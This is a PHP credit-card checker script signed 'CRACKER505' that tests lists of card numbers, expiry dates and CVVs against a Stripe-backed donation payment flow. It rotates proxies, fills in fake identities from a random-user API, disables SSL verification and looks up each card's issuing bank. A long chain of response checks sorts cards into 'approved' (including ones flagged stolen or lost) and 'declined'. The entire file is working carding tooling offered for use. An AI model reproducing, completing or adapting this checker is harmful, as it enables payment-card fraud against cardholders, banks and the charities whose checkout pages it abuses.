<?php

///////////////====== By 👑 CRACKER505 👑 ===============\\\\\\\\\\\\\\\

//// STRIPE 2 REQ RAW API

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mm = multiexplode(array(":", "|", ""), $lista)[1];
$yy = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function cracker505proxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = cracker505proxys();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$first = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]

$username = 'Put Zone Username Here';
$password = 'Put Zone Password Here';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[1ST REQUEST ]===============//////////////////////////////

$ch = curl_init();
////////////////////////////==============[Proxy Section]===============//////////////////////////////
/////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
////////=========Socks Proxy
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
/////////========== WEBSHARE PROXY =========\\\\\\\\\\
curl_setopt($ch, CURLOPT_PROXY, 'socks5://p.webshare.io:1080');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'user:pass');  // ENTER WEBSHARE DETAILS
//////////////==================[END OF PROXY SELECTION]=================//////////////

curl_setopt($ch, CURLOPT_URL, '......');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: .............',
    'accept: ................',
    'accept-language: .......',
    'content-type: ..........',
    'origin: ................',
    'referer: ...............',
    'sec-fetch-dest: ........',
    'sec-fetch-mode: ........',
    'sec-fetch-site: ........'));// ENTER THE REQUEST HEADERS
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

curl_setopt($ch, CURLOPT_POSTFIELDS, '.......');// ENTER THE POSTFIELDS

$result1 = curl_exec($ch);
$token1 = trim(strip_tags(getStr($result1,'"id": "','"')));




////////////////////////////===============[2 REQUEST]=============////////////////////////

$ch = curl_init();
////////////////////////////==============[Proxy Section]===============//////////////////////////////
/////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
////////=========Socks Proxy
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
/////////========== WEBSHARE PROXY =========\\\\\\\\\\
curl_setopt($ch, CURLOPT_PROXY, 'socks5://p.webshare.io:1080');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'user:pass');  // ENTER WEBSHARE DETAILS
//////////////==================[END OF PROXY SELECTION]=================//////////////

curl_setopt($ch, CURLOPT_URL, '......');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: .............',
    'accept: ................',
    'accept-language: .......',
    'content-type: ..........',
    'origin: ................',
    'referer: ...............',
    'sec-fetch-dest: ........',
    'sec-fetch-mode: ........',
    'sec-fetch-site: ........'));// ENTER THE REQUEST HEADERS
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

curl_setopt($ch, CURLOPT_POSTFIELDS, 'REMEMBER TO USE TOKEN 1 HERE');

$result2 = curl_exec($ch);
$message = trim(strip_tags(getstr($result2,'"message":"','"')));
$token2 = trim(strip_tags(getstr($result2,'"id":"','"')));





////////////////////////////===============[3ND REQUEST]=============////////////////////////

$ch = curl_init();
////////////////////////////==============[Proxy Section]===============//////////////////////////////
/////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
////////=========Socks Proxy
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
/////////========== WEBSHARE PROXY =========\\\\\\\\\\
curl_setopt($ch, CURLOPT_PROXY, 'socks5://p.webshare.io:1080');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'user:pass');  // ENTER WEBSHARE DETAILS
//////////////==================[END OF PROXY SELECTION]=================//////////////

curl_setopt($ch, CURLOPT_URL, '......');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: .............',
    'accept: ................',
    'accept-language: .......',
    'content-type: ..........',
    'origin: ................',
    'referer: ...............',
    'sec-fetch-dest: ........',
    'sec-fetch-mode: ........',
    'sec-fetch-site: ........'));// ENTER THE REQUEST HEADERS
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

curl_setopt($ch, CURLOPT_POSTFIELDS, 'REMEMBER TO USE TOKEN 1 AND TOKEN 2 HERE');

$result3 = curl_exec($ch);
$message = trim(strip_tags(getstr($result3,'"message":"','"')));






////////////////////////////===[Bin Lookup ]===============//////////////////////////////
$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/' . $cctwo . '');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: lookup.binlist.net',
    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim, true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];
$cctype = $fim['scheme'];
$brand = $fim['brand'];
$emoji = $fim['emoji'];


$cctype = strtoupper($cctype);
$type = strtoupper($type);
$brand = strtoupper($brand);
////////////////////////////===[Card Response Start]===============//////////////////////////////

if(strpos($result3, '/donations/thankyou?donationnumber=','' )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Approved (͏CVV)</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result2,'"cvccheck":"pass",')){
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Approved (͏CVV</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3, "Thank You For Donation." )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Approved (͏CVV) </span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3, "Thank You." )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Approved (͏CVV) </span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3,'"status": "succeeded"')){
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Approved (͏CVV</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Approved (͏CVV - Incorrect Zip </span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3, "incorrectzip" )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Approved (͏CVV - Incorrect Zip )</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3, "Success" )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Approved (͏CVV</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3, "succeeded." )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Approved (͏CVV</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result2,"fraudulent")){
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Fraudulent Card</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result,"fraudulent")){
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Fraudulent Card</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Insufficient Funds</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3, "insufficientfunds")) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Insufficient Funds</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3, "lostcard" )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Lost Card</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3, "stolencard" )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Stolen Card</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result2, 'security code is incorrect.' )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Approved (CCN) <span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  }
elseif(strpos($result3, "Your card's security code is incorrect." )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Approved (CCN) <span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
   }
elseif(strpos($result2, "Your card's security code is incorrect." )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Approved (CCN) <span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result2, 'security code is invalid.' )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Approved (CCN) <span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result2, "incorrectcvc" )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Approved (CCN) <span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result2, "pickupcard" )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Pickup Card (Reported Stolen Or Lost)</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
  echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Expired Card</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result2, "expiredcard" )) {
  echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Expired Card </span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3, "incorrectcvc" )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Approved </span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3, "pickupcard" )) {
  echo '<span class="badge badge-success">👑 Aprovada 👑</span> :<span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Pickup Card (Reported Stolen Or Lost) </span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3, 'Your card has expired.')) {
  echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Expired Card</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3, "expiredcard" )) {
  echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Expired Card</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  }
elseif(strpos($result2, 'Your card number is incorrect.')) {
  echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Incorrect Card Number</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result2, "incorrectnumber")) {
  echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Incorrect Card Number</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}

elseif(strpos($result1, "donothonor")) {
  echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Declined : DoNotHonor</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result1, 'Your card was declined.')) {
  echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Card Declined</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result2, 'Your card was declined.')) {
  echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Card Declined</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  }
elseif(strpos($result3, 'Your card was declined.')) {
  echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Card Declined</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}

elseif(strpos($result2, "genericdecline")) {
  echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Declined : GenericDecline</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result2,'"cvccheck": "unavailable"')){
  echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">CVCCheck : Unavailable</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}

elseif(strpos($result2,'"cvccheck": "fail"')){
  echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">CVCUnchecked : Fail</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif (strpos($result2,'Your card does not support this type of purchase.')) {
  echo '<span class="badge badge-danger">☠️ Reprovada ☠️ </span> <span class="badge badge-danger">'.$lista.'</span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Card Doesnt Support Purchase </span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result2,"transactionnotallowed")){
  echo '<span class="badge badge-danger">☠️ Reprovada ☠️ </span> <span class="badge badge-danger">'.$lista.'</span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Card Doesnt Support Purchase </span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3,"threedsecureredirect")){
   echo '<span class="badge badge-danger">☠️ Reprovada ☠️ </span> <span class="badge badge-danger">'.$lista.'</span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Card Doesnt Support Purchase </span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result3, 'Card is declined by your bank, please contact them for additional information.')) {
  echo '<span class="badge badge-danger">☠️ Reprovada ☠️ </span> <span class="badge badge-danger">'.$lista.'</span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">3D Secure Redirect </span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result2,"missingpaymentinformation")){
   '<span class="badge badge-danger">☠️ Reprovada ☠️ </span> <span class="badge badge-danger">'.$lista.'</span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Missing Payment Informations </span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
elseif(strpos($result2, "Payment cannot be processed, missing credit card number")) {
   '<span class="badge badge-danger">☠️ Reprovada ☠️ </span> <span class="badge badge-danger">'.$lista.'</span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Missing Credit Card Number </span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}
else {
  echo '<span class="badge badge-danger">☠️ Reprovada ☠️ </span> <span class="badge badge-danger">'.$lista.'</span> | <span class="badge badge-success">STRIPE</span> | <span class="badge badge-warning">Dead Proxy/Error Not listed </span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}

////////////////////////=================[Card Response End]==================/////////////////////////////////
curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
//echo $result 

////////////////================[STRIPE 2 REQ RAW API]==============////////////
///////////////====== By 👑 CRACKER505 👑 ===============\\\\\\\\\\\\\\\
?>
